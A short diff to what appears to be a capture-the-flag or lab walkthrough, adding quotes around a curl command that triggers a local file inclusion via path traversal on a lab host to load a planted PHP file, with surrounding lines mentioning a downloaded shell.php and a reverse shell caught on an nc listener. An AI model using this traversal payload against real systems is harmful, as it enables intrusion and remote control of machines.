@@ -186,7 +186,7 @@ This code, when executed, will download our `shell.php` file and run it, establi
 We trigger the exploit by accessing our malicious database file through the LFI vulnerability:
 
 ```
-curl http://192.168.56.106/view.php?page=../../../../../usr/databases/hack.php
+curl "http://192.168.56.106/view.php?page=../../../../../usr/databases/hack.php"
 ```
 
 This should result in a shell connection on our `nc` listener:
